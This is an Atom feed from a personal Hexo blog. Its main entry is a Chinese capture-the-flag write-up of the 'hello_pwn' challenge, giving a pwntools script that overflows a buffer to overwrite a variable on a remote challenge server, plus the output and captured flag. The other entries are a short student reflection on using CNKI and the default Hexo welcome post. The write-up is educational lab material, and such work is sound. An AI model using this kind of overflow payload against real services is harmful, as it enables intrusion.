<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoxiaoxy</title>
  
  
  <link href="http://xiaoxiaoxy1.github.io/atom.xml" rel="self"/>
  
  <link href="http://xiaoxiaoxy1.github.io/"/>
  <updated>2021-10-27T14:52:56.719Z</updated>
  <id>http://xiaoxiaoxy1.github.io/</id>
  
  <author>
    <name>xiaoxiaoxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界-hello_pwn</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/27/Note/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/27/Note/</id>
    <published>2021-10-27T13:56:07.000Z</published>
    <updated>2021-10-27T14:52:56.719Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211027220220140.png" alt="image-20211027220220140"></p><p>下载附件，ida反编译并找出主函数：</p><p><img src="image-20211027224506556.png" alt="image-20211027224506556"></p><p>看到read函数，初步判断是栈溢出题</p><p>进入sub函数查看：</p><p><img src="image-20211027224643668.png" alt="image-20211027224643668"></p><p>ok，解题思路：只要能连接上服务器，并执行该文件，在与服务器交互中，输入一串payload使程序中的dword_60106C值变为1853186401后进入sub函数我们就能拿到服务器上的flag。</p><p>好的，先让我们阅读一下read（）函数，点进read（）函数中的unk_601068变量</p><p><img src="image-20211027224714446.png" alt="image-20211027224714446"></p><p>对比一下：</p><p><img src="image-20211027224732285.png" alt="image-20211027224732285"></p><p>发现这两个变量的偏移量为6C-68 = 4（16进制）</p><p>因此我们可以构造payload = ‘aaaa’+p64(1853186401)，具体脚本如下：</p><p><img src="C:\blog\source_posts\Note.assets\image-20211027224758038.png" alt="image-20211027224758038"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&#x27;63031&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python gfsj1.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 54083: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;6a5a35ff4fd3d526fbb7a7263ec67500&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to 111.200.241.244 port 54083</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先，我们看到题目：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image-20211027220220140.png&quot; alt=&quot;image-20211027220220140&quot;&gt;&lt;/p&gt;
&lt;p&gt;下载附件，ida反编译并找出主函数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>The first blog of xiaoxiaoxy</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/08/28/The-first-blog-of-xiaoxiaoxy/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/08/28/The-first-blog-of-xiaoxiaoxy/</id>
    <published>2021-08-28T09:03:57.000Z</published>
    <updated>2021-08-28T09:36:51.815Z</updated>
    
    <content type="html"><![CDATA[<h3 id="哈哈哈"><a href="#哈哈哈" class="headerlink" title="哈哈哈"></a>哈哈哈</h3><p>三级标题</p><h5 id="哈哈哈-1"><a href="#哈哈哈-1" class="headerlink" title="哈哈哈"></a>哈哈哈</h5><p>五级标题</p><h1 id="哈哈哈-2"><a href="#哈哈哈-2" class="headerlink" title="哈哈哈"></a>哈哈哈</h1><p>一级标题</p><h1 id="知网读后感"><a href="#知网读后感" class="headerlink" title="知网读后感"></a>知网读后感</h1><p>因为之前从来没有进过知网，所以一开始并不知道如何进知网，在整个探索知网的旅程中，我大致经历了以下几个历程：摸索如何进知网、走进知网并摸索如何查看文章以及通过关键词搜索并极其粗略地观看了几篇文章。在这些历程中，我还产生许多感想，接下来，我将更加详细地为你阐述我探索知网历程中的一些细节，并伴随我的感受一同记录于下文之中。</p><h2 id="寻找进知网的方法"><a href="#寻找进知网的方法" class="headerlink" title="寻找进知网的方法"></a>寻找进知网的方法</h2><p> 因为之前没接触过知网，老师讲的进知网的方法也没太注意听所以一开始并不知道怎么进知网，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;哈哈哈&quot;&gt;&lt;a href=&quot;#哈哈哈&quot; class=&quot;headerlink&quot; title=&quot;哈哈哈&quot;&gt;&lt;/a&gt;哈哈哈&lt;/h3&gt;&lt;p&gt;三级标题&lt;/p&gt;
&lt;h5 id=&quot;哈哈哈-1&quot;&gt;&lt;a href=&quot;#哈哈哈-1&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/08/28/hello-world/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/08/28/hello-world/</id>
    <published>2021-08-28T04:35:23.817Z</published>
    <updated>2021-08-28T04:35:23.817Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
